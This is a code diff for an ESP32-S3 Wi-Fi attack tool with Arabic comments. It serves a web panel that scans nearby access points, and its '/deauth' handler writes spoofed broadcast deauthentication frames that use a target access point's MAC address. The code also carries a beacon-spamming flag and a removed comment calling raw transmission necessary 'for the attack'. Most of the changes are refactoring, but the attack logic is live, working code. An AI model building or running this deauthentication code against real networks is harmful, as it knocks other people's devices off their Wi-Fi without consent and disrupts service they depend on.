@@ -18,12 +18,12 @@ bool isBeaconSpamming = false;
 uint8_t target_channel = 1;
 
 // قوائم المسح
-struct Network {
+struct ApInfo {
   String ssid;
   uint8_t bssid[6];
   int channel;
 };
-Network apList[15];
+ApInfo apList[15];
 int apCount = 0;
 
 // ==========================================
@@ -54,7 +54,6 @@ const char index_html[] PROGMEM = R"rawliteral(
   .btn-danger { background: var(--danger); color: white; }
   input, select { width: 100%; padding: 12px; margin: 5px 0; background: #111; border: 1px solid #444; color: white; border-radius: 6px; }
   #console { background: #000; color: var(--primary); padding: 10px; border-radius: 6px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; }
-  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
 </style>
 </head><body>
 <header><h1>⚡ ESP32-S3 Tool</h1></header>
@@ -204,12 +203,10 @@ void setup() {
   WiFi.mode(WIFI_AP_STA); 
   WiFi.softAP(ssid, password);
   
-  // تفعيل وضع الإرسال الخام (ضروري للهجوم)
   esp_wifi_set_promiscuous(true);
 
-  // مسارات الخادم
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send_P(200, "text/html", index_html);
+    request->send(200, "text/html", index_html);
   });
 
   server.on("/scanap", HTTP_GET, [](AsyncWebServerRequest *request){
@@ -229,7 +226,6 @@ void setup() {
       char macStr[18];
       sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
         apList[i].bssid[0],apList[i].bssid[1],apList[i].bssid[2],apList[i].bssid[3],apList[i].bssid[4],apList[i].bssid[5]);
-      // التنسيق: index|mac|channel|ssid
       out += String(i+1) + "|" + macStr + "|" + apList[i].channel + "|" + apList[i].ssid + "\n";
     }
     request->send(200, "text/plain", out);
@@ -237,7 +233,6 @@ void setup() {
 
   server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
     if (request->hasParam("type") && request->hasParam("mac") && request->hasParam("ch")) {
-      String type = request->getParam("type")->value();
       String macStr = request->getParam("mac")->value();
       target_channel = request->getParam("ch")->value().toInt();
 
@@ -245,11 +240,9 @@ void setup() {
       sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
              &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);
 
-      if (type == "ap") {
-        memcpy(&deauthPacket[4], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6); 
-        memcpy(&deauthPacket[10], target, 6); 
-        memcpy(&deauthPacket[16], target, 6); 
-      }
+      memcpy(&deauthPacket[4], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6); 
+      memcpy(&deauthPacket[10], target, 6); 
+      memcpy(&deauthPacket[16], target, 6); 
 
       if(!isDeauthing) {
         isDeauthing = true;
